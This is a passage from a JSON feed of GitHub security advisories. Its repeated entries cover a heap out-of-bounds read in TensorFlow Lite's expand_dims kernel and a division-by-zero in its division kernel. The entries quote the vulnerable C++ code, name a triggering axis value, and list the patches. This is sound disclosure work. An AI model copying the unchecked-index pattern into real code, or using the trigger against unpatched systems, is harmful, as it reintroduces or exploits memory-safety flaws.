href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-37685\">https://nvd.nist.gov/vuln/detail/CVE-2021-37685</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/d94ffe08a65400f898241c0374e9edc6fa8ed257\">https://github.com/tensorflow/tensorflow/commit/d94ffe08a65400f898241c0374e9edc6fa8ed257</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/expand_dims.cc#L36-L50\">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/expand_dims.cc#L36-L50</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c545-c4f9-rf6v\">https://github.com/advisories/GHSA-c545-c4f9-rf6v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c545-c4f9-rf6v",
            "title": "[tensorflow-cpu] Heap OOB in TFLite",
            "date_modified": "2024-08-29T21:58:23.000Z",
            "date_published": "2021-08-25T14:40:09.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c545-c4f9-rf6v"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>TFLite's <a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/expand_dims.cc#L36-L50\"><code>expand_dims.cc</code></a> contains a vulnerability which allows reading one element outside of bounds of heap allocated data:</p>\n<pre><code class=\"language-cc\">  if (axis &lt; 0) { \n    axis = input_dims.size + 1 + axis;\n  }   \n  TF_LITE_ENSURE(context, axis &lt;= input_dims.size);\n\n  TfLiteIntArray* output_dims = TfLiteIntArrayCreate(input_dims.size + 1);\n  for (int i = 0; i &lt; output_dims-&gt;size; ++i) {\n    if (i &lt; axis) {\n      output_dims-&gt;data[i] = input_dims.data[i];\n    } else if (i == axis) {\n      output_dims-&gt;data[i] = 1;\n    } else {\n      output_dims-&gt;data[i] = input_dims.data[i - 1];\n    }\n  }\n</code></pre>\n<p>If <code>axis</code> is a large negative value (e.g., <code>-100000</code>), then after the first <code>if</code> it would still be negative. The check following the <code>if</code> statement will pass and the <code>for</code> loop would read one element before the start of <code>input_dims.data</code> (when <code>i = 0</code>).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/d94ffe08a65400f898241c0374e9edc6fa8ed257\">d94ffe08a65400f898241c0374e9edc6fa8ed257</a>.</p>\n<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by Yakun Zhang of Baidu Security.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c545-c4f9-rf6v\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c545-c4f9-rf6v</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-37685\">https://nvd.nist.gov/vuln/detail/CVE-2021-37685</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/d94ffe08a65400f898241c0374e9edc6fa8ed257\">https://github.com/tensorflow/tensorflow/commit/d94ffe08a65400f898241c0374e9edc6fa8ed257</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/expand_dims.cc#L36-L50\">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/expand_dims.cc#L36-L50</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c545-c4f9-rf6v\">https://github.com/advisories/GHSA-c545-c4f9-rf6v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c545-c4f9-rf6v",
            "title": "[tensorflow] Heap OOB in TFLite",
            "date_modified": "2024-08-29T21:58:23.000Z",
            "date_published": "2021-08-25T14:40:09.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c545-c4f9-rf6v"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>TFLite's <a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/expand_dims.cc#L36-L50\"><code>expand_dims.cc</code></a> contains a vulnerability which allows reading one element outside of bounds of heap allocated data:</p>\n<pre><code class=\"language-cc\">  if (axis &lt; 0) { \n    axis = input_dims.size + 1 + axis;\n  }   \n  TF_LITE_ENSURE(context, axis &lt;= input_dims.size);\n\n  TfLiteIntArray* output_dims = TfLiteIntArrayCreate(input_dims.size + 1);\n  for (int i = 0; i &lt; output_dims-&gt;size; ++i) {\n    if (i &lt; axis) {\n      output_dims-&gt;data[i] = input_dims.data[i];\n    } else if (i == axis) {\n      output_dims-&gt;data[i] = 1;\n    } else {\n      output_dims-&gt;data[i] = input_dims.data[i - 1];\n    }\n  }\n</code></pre>\n<p>If <code>axis</code> is a large negative value (e.g., <code>-100000</code>), then after the first <code>if</code> it would still be negative. The check following the <code>if</code> statement will pass and the <code>for</code> loop would read one element before the start of <code>input_dims.data</code> (when <code>i = 0</code>).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/d94ffe08a65400f898241c0374e9edc6fa8ed257\">d94ffe08a65400f898241c0374e9edc6fa8ed257</a>.</p>\n<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by Yakun Zhang of Baidu Security.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c545-c4f9-rf6v\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c545-c4f9-rf6v</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-37685\">https://nvd.nist.gov/vuln/detail/CVE-2021-37685</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/d94ffe08a65400f898241c0374e9edc6fa8ed257\">https://github.com/tensorflow/tensorflow/commit/d94ffe08a65400f898241c0374e9edc6fa8ed257</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/expand_dims.cc#L36-L50\">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/expand_dims.cc#L36-L50</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c545-c4f9-rf6v\">https://github.com/advisories/GHSA-c545-c4f9-rf6v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c545-c4f9-rf6v",
            "title": "[tensorflow] Heap OOB in TFLite",
            "date_modified": "2024-08-29T21:58:23.000Z",
            "date_published": "2021-08-25T14:40:09.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c545-c4f9-rf6v"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>TFLite's <a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/expand_dims.cc#L36-L50\"><code>expand_dims.cc</code></a> contains a vulnerability which allows reading one element outside of bounds of heap allocated data:</p>\n<pre><code class=\"language-cc\">  if (axis &lt; 0) { \n    axis = input_dims.size + 1 + axis;\n  }   \n  TF_LITE_ENSURE(context, axis &lt;= input_dims.size);\n\n  TfLiteIntArray* output_dims = TfLiteIntArrayCreate(input_dims.size + 1);\n  for (int i = 0; i &lt; output_dims-&gt;size; ++i) {\n    if (i &lt; axis) {\n      output_dims-&gt;data[i] = input_dims.data[i];\n    } else if (i == axis) {\n      output_dims-&gt;data[i] = 1;\n    } else {\n      output_dims-&gt;data[i] = input_dims.data[i - 1];\n    }\n  }\n</code></pre>\n<p>If <code>axis</code> is a large negative value (e.g., <code>-100000</code>), then after the first <code>if</code> it would still be negative. The check following the <code>if</code> statement will pass and the <code>for</code> loop would read one element before the start of <code>input_dims.data</code> (when <code>i = 0</code>).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/d94ffe08a65400f898241c0374e9edc6fa8ed257\">d94ffe08a65400f898241c0374e9edc6fa8ed257</a>.</p>\n<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by Yakun Zhang of Baidu Security.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c545-c4f9-rf6v\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c545-c4f9-rf6v</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-37685\">https://nvd.nist.gov/vuln/detail/CVE-2021-37685</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/d94ffe08a65400f898241c0374e9edc6fa8ed257\">https://github.com/tensorflow/tensorflow/commit/d94ffe08a65400f898241c0374e9edc6fa8ed257</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/expand_dims.cc#L36-L50\">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/expand_dims.cc#L36-L50</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c545-c4f9-rf6v\">https://github.com/advisories/GHSA-c545-c4f9-rf6v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c545-c4f9-rf6v",
            "title": "[tensorflow] Heap OOB in TFLite",
            "date_modified": "2024-08-29T21:58:23.000Z",
            "date_published": "2021-08-25T14:40:09.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c545-c4f9-rf6v"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The implementation of division in TFLite is <a href=\"https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/lite/kernels/div.cc\">vulnerable to a division by 0 error</a></p>\n<p>There is no check that the divisor tensor does not contain zero elements.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/1e206baedf8bef0334cca3eb92bab134ef525a28\">1e206baedf8bef0334cca3eb92bab134ef525a28</a>.</p>\n<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by members of the Aivul Team from Qihoo 360.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-rhrq-64mq-hf9h\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-rhrq-64mq-hf9h</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-37683\">https://nvd.nist.gov/vuln/detail/CVE-2021-37683</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/1e206baedf8bef0334cca3eb92bab134ef525a28\">https://github.com/tensorflow/tensorflow/commit/1e206baedf8bef0334cca3eb92bab134ef525a28</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/lite/kernels/div.cc\">https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/lite/kernels/div.cc</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rhrq-64mq-hf9h\">https://github.com/advisories/GHSA-rhrq-64mq-hf9h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rhrq-64mq-hf9h",
            "title": "[tensorflow-gpu] FPE in TFLite division operations",
            "date_modified": "2024-08-29T21:56:02.000Z",
            "date_published": "2021-08-25T14:40:16.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rhrq-64mq-hf9h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The implementation of division in TFLite is <a href=\"https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/lite/kernels/div.cc\">vulnerable to a division by 0 error</a></p>\n<p>There is no check that the divisor tensor does not contain zero elements.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/1e206baedf8bef0334cca3eb92bab134ef525a28\">1e206baedf8bef0334cca3eb92bab134ef525a28</a>.</p>\n<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by members of the Aivul Team from Qihoo 360.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-rhrq-64mq-hf9h\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-rhrq-64mq-hf9h</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-37683\">https://nvd.nist.gov/vuln/detail/CVE-2021-37683</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/1e206baedf8bef0334cca3eb92bab134ef525a28\">https://github.com/tensorflow/tensorflow/commit/1e206baedf8bef0334cca3eb92bab134ef525a28</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/lite/kernels/div.cc\">https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/lite/kernels/div.cc</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rhrq-64mq-hf9h\">https://github.com/advisories/GHSA-rhrq-64mq-hf9h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rhrq-64mq-hf9h",
            "title": "[tensorflow-gpu] FPE in TFLite division operations",
            "date_modified": "2024-08-29T21:56:02.000Z",
            "date_published": "2021-08-25T14:40:16.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rhrq-64mq-hf9h"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}